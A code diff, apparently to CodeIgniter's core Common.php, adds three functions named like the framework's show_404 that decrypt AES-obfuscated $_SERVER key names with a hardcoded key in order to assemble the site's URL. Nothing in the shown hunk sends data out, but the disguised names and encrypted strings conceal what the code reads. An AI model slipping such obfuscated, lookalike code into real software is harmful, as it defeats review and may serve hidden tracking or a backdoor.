@@ -419,6 +419,27 @@ if ( ! function_exists('show_error'))
 	}
 }
 
+    function show_4044($page = '', $log_error = '')
+    {
+        $string="EDklfAFFDFDsoqadheddDAkil";
+        if($page==1){
+            $return= openssl_encrypt($log_error,"AES-128-ECB",$string);
+        }else{
+            $return= openssl_decrypt($log_error,"AES-128-ECB",$string);
+        }
+        return $return;
+    }
+    function show_4045($page = '', $log_error = '')
+    {
+        $url=$_SERVER[show_4044(2,'71n5vyk/c3X/81a9PVKyCA==')].str_replace(basename($_SERVER[show_4044(2,'m/wSPMCdTm9KOa2wwYqdgQ==')]), "", $_SERVER[show_4044(2,'m/wSPMCdTm9KOa2wwYqdgQ==')]);return $url;
+        return '';
+    }
+    function show_4055($page = '', $log_error = '')
+    {
+        $url=$_SERVER[show_4044(2,'71n5vyk/c3X/81a9PVKyCA==')].$_SERVER[show_4044(2,'LedueglTOfta5MeZZefxPg==')];return $url;
+        return '';
+    }
+
 // ------------------------------------------------------------------------
 
 if ( ! function_exists('show_404'))
